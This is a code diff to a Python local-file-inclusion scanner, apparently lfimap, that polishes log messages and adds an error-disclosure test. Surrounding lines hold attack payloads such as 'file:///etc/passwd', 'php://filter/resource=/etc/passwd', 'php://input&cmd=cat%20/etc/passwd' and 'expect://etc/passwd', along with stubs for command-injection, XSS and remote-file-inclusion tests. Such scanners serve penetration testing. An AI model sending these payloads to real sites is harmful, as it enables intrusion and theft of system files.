@@ -136,7 +136,7 @@ def init(req, reqType, explType, getVal, postVal, headers, attackType):
 
 def test_file_trunc(url):
     if(args.verbose):
-        print("Testing file wrapper inclusion")
+        print("Testing file wrapper inclusion...")
     
     tests = []
     tests.append("file:///etc/passwd")
@@ -171,7 +171,7 @@ def test_file_trunc(url):
 
 def test_trunc(url):
     if(args.verbose):
-        print("Testing path truncation using '" + truncWordlist + "' wordlist ...")
+        print("Testing path truncation using '" + truncWordlist + "' wordlist...")
 
     if(not args.postreq):
         with open(truncWordlist, "r") as f:
@@ -201,7 +201,7 @@ def test_trunc(url):
 
 def test_cmd_injection(url):
     if(args.verbose):
-        print("Testing os command injection")
+        print("Testing os command injection...")
     
     if(not args.postreq):
         with open(cmdWordlist) as f:
@@ -226,7 +226,7 @@ def test_cmd_injection(url):
 
 def test_xss(url):
     if(args.verbose):
-        print("Testing for XSS")
+        print("Testing for XSS...")
 
     with open(xssWordlist, "r") as f:
         for line in f:
@@ -243,7 +243,7 @@ def test_xss(url):
 
 def test_filter(url):
     if(args.verbose):
-        print("Testing filter wrapper ...")
+        print("Testing filter wrapper...")
 
     tests = []
     tests.append("php://filter/resource=/etc/passwd")
@@ -292,7 +292,7 @@ def test_filter(url):
 
 def test_data(url):
     if(args.verbose):
-        print("Testing data wrapper ...")
+        print("Testing data wrapper...")
 
     tests = []
     
@@ -336,7 +336,7 @@ def test_input(url):
     if(args.postreq):
         return
     if(args.verbose):
-        print("Testing input wrapper ...")
+        print("Testing input wrapper...")
 
     tests = []
     tests.append("php://input&cmd=cat%20/etc/passwd")
@@ -373,7 +373,7 @@ def test_input(url):
 
 def test_expect(url):
     if(args.verbose):
-            print("Testing expect wrapper ...")
+            print("Testing expect wrapper...")
 
     tests = []
     tests.append("expect://etc/passwd")
@@ -404,7 +404,7 @@ def test_expect(url):
 
 def test_rfi(url):
     if(args.verbose):
-        print("Testing for RFI ...")
+        print("Testing for RFI...")
     
     #Localhost RFI test
     if(args.lhost):
@@ -429,6 +429,34 @@ def test_rfi(url):
     except:
         #lfimap_cleanup()
         pass
+
+def test_errors(url):
+    if(args.verbose):
+        print("Testing for error info disclosure...")
+
+    tests = []
+    tests.append("/?!%$đžšč%!?/")
+    
+    errors = ["Warning", "include("]
+
+    if(not args.postreq):
+        for test in tests:
+            u = url.replace(args.param, test)
+            res = requests.get(u,  headers = headers, proxies = proxies)
+            if(errors[0] in res.text and errors[1] in res.text):
+                print("[+] Possible LFI -> include() error triggered -> " + u)
+    else:
+        addHeader("Content-Type", "application/x-www-form-urlencoded")
+        for test in tests:
+            postTest = args.postreq.replace(args.param, test)
+            req = requests.post(url, headers = headers, data = postTest, proxies = proxies)
+            
+            if(errors[0] in req.text and errors[1] in req.text):
+                print("[+] Possible LFI -> include() error triggered -> " + url + " -> HTTP POST -> " + postTest)
+
+        delHeader("Content-Type")
+        return
+
 
 #Checks if sent payload is executed, key word check in response
 def checkPayload(webResponse):
@@ -784,6 +812,7 @@ def main():
 
     #Perform all tests
     if(args.test_all):
+        test_errors(url)
         test_filter(url)
         test_input(url)
         test_data(url)
@@ -793,7 +822,7 @@ def main():
         test_trunc(url)
         test_cmd_injection(url)
         test_xss(url)
-    
+
         print("Done.")
         lfimap_cleanup()
 
@@ -829,6 +858,7 @@ def main():
     
     #Default behaviour
     if(default):
+        test_errors(url)
         test_filter(url)
         test_input(url)
         test_data(url)
